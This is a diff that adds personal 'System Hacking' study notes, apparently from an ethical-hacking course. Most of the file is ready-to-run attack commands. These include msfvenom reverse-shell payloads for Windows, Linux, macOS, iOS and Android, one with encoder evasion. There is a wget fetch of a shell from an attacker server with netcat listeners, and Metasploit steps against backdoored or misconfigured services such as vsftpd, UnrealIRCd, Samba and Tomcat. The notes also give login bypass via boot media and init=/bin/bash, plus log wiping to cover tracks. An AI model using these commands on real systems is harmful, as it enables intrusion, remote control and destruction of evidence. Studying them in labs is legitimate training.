@@ -1,0 +1,191 @@
+                                                                  System Hacking
+
+#Goals of System Hacking
+1)Gaining Access
+2)Escalating privileges
+3)Executing applications
+4)Hiding files
+5)Clearing tracks
+============================================================================================================================================================
+System Hacking is the way Hackers get access to individual computers.
+
+#Active Online Attacks
+The attacker performs password cracking by directly communicating with the victim's machine.
+Trojan/Spyware/Keyloggers
+The attacker installs Trojan/Spyware/Keylogger on the victim's machine to collect the victim's user names and passwords.
+Trojan/Spyware/Keylogger runs in the background and sends back all user credentials to the attacker.
+============================================================================================================================================================
+Offline Method - 
+#1. OS Bypassing
+
+Online Procedure - First Crack the Password then get files
+Error Generation Method - To create conflict when the system loads files from the boot manager
+Offline Pro - Use Bypass OS and get files without cracking the Password
+
+1. Windows - Win7/win8/win10/win11
+2. Linux - Kali/Ubantu/
+
+#1. Online Method
+When you need to crack or bypass the password, change the OS login password when the system is up, and you do not know the current password. It only
+works in windows ultimate or a professional version.
+1. Right-click on "My Computers"
+2. Click on "Manage"
+3. Click on "Local Users and Groups", in the left pane
+4. Click on "Users"
+5. Choose the user, for whom you want to change the password.
+6. Right Click
+7. Set the Password
+
+#2. Offline Method
+This is the condition when the device is in shut-down mode and we cannot open the group editing policies.
+SAM - Security Account Manager
+C:\Windows\System32\Config\SAM
+Hiren Boot CD - Free
+Kon Boot CD - Paid
+These are live bootable OS. We use tools like Rufus, to make the media bootable.
+BIOS - Basic Input Output System
+Live OS - It replaces the BIOS of the Computer or the device from the one which is in the bootable media. 
+
+#authentication mechanism in windows
+1)Security Accounts Manager (SAM)
+2)NTLM New Technology LAN Manager
+3)Kerberos
+============================================================================================================================================================
+3. Kali Linux password bypass -
+Here are some steps
+1. Start your system normally
+2. After the bootloader start click on the e button on the keyboard
+3. Now find the Linux word starting line and go to the last part of the line then you will find ro quiet splash and just remove all words until
+ro word and type rw init=/bin/bash and press ctrl+x and then press f10 then we will get the terminal of the root.
+4. Now we can change our Kali password by typing the command #passwd root(Username)
+5. Then type command #exec /sbin/init our kali will get restart and our password is changed successfully.
+============================================================================================================================================================
+https://medium.com/@msbj/basic-msfvenom-exploit-for-windows-480a19cf8801
+Basic msfvenom Exploit For Windows (LAN & WAN) Complete Guide
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=“Your IP” LPORT=4444 -f exe -o Payload.exe
+msfconsole
+use exploit/multi/handler
+show options
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST "Your IP"
+set LPORT "Your listening port"
+run
+
+
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
+python3 -m http.server 8080
+wget http://ip:8080/shell.elf (server) homeuser
+chmod +x shell.elf
+nc -nvlp 4444 (local machine)
+
+msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<Your_IP> LPORT=4444 -f macho -o payload.macho
+msfvenom -p osx/x64/shell_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f macho -o payload.macho
+msfconsole -q
+use exploit/multi/handler
+set payload osx/x64/meterpreter/reverse_tcp
+set LHOST <Your_IP>
+set LPORT 4444
+
+msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=4444 -f macho -o payload.macho
+use exploit/multi/handler
+set payload apple_ios/aarch64/meterpreter_reverse_tcp
+set LHOST <Your_IP>
+set LPORT 4444
+exploit
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=ip LPORT=4545 -o hacker.apk
+msfvenom -l payloads
+msfvenom -l archs
+msfvenom -l platforms
+msfvenom -l formats
+msfvenom -l encoders
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 10 LHOST=ip LPORT=4545 -f exe -o hacker.exe
+============================================================================================================================================================
+#How to Exploit || port 137-139/445 || netbios-ssn Samba smbd
+nmap -p 137,445 -A ip
+msfconsole 
+search samba 
+use exploit/multi/samba/usermap_script 
+============================================================================================================================================================
+1)Exploiting FTP through the Metasploit framework.
+msfconsole
+search vsftpd
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.137.128
+run
+============================================================================================================================================================
+2)Telnet Exploitation (Port 23):
+telnet ip
+============================================================================================================================================================
+3)VNC Exploitation (Port 5900):
+msfconsole
+search auxiliary/scanner/vnc/vnc_login
+set RHOST 192.168.137.128
+vncviewer 192.168.137.128 = password
+============================================================================================================================================================
+#Services « R » – Port 512/513/514
+Description
+TCP ports 512, 513 and 514 are known as "r" services which can allow an attacker to enter the system if they are incorrectly configured. RSH Remote Shell services (rsh, rexec, and rlogin) are active.We use the rsh-client tool to be able to use the rlogin command and therefore connect as root directly on the machine, without a password.
+
+1)rlogin -l root ip
+============================================================================================================================================================
+#Backdoor IRC – UnrealIRCd – Port 6667
+This issue is related to port 6667 which runs UnrealRCD IRC daemon, a version that contains a backdoor
+1)use exploit/unix/irc/unreal_ircd_3281_backdoor
+2)show options
+3)set rhosts ip
+4)run/exploit
+============================================================================================================================================================
+#Java-rmi – Port 1099
+This flaw is related to the default configuration of the RMI registry and RMI activation services, which allow classes to be loaded from any remote URL (HTTP).
+
+1)use exploit/multi/misc/java_rmi_server
+2)show options
+3)set rhost
+4)set payload java/meterpreter/reverse_tcp
+5)run
+============================================================================================================================================================
+#PostgreSQL Exploitation (Port 5432):
+msfconsole
+search PostgreSQL
+set RHOSTS 192.168.137.128
+set LHOST 192.168.137.129
+run
+============================================================================================================================================================
+5)Apache Tomcat Exploitation (Port 8180):
+msfconsole
+search apache tomcat
+use exploit/multi/http/tomcat_mgr_upload
+set RHOSTS 192.168.137.128
+set RPORT 8180
+set HttpPassword tomcat
+set HttpUsername tomcat
+run
+============================================================================================================================================================
+#SSH – Port 22
+1)use exploit/unix/misc/distcc_exec
+2)exploit(distcc_exec) > set RHOST 192.168.99.131
+3)run/exploit
+
+#msfconsole -q
+1)use auxiliary/scanner/ssh/ssh_login
+2)set RHOSTS [target_IP]
+3)run
+============================================================================================================================================================
+#Privilege Escalation
+n attacker can gain access to the network using a non-admin user account, and the next step would be to gain administrative privilege.
+
+#Escalation of Privileges:
+There are two types of Privilege Escalation:
+1)Horizontal Privilege Escalation occurs when a malicious user attempts to access resources and functions that belong to peer users, who have similar access permissions.
+
+2)Vertical Privilege Escalation occurs when a malicious user attempts to access resources and functions that belong to a user with higher privileges, such as application or site administrators.
+============================================================================================================================================================
+#Covering Tracks
+Once an attacker finishes his work, he wants to erase all tracks leading the investigators tracing back to him. This can be done using
+1)Disable auditing.
+2)Clearing logs.
+3)Modifying logs, registry files.
+4)Removing all files, folders created.
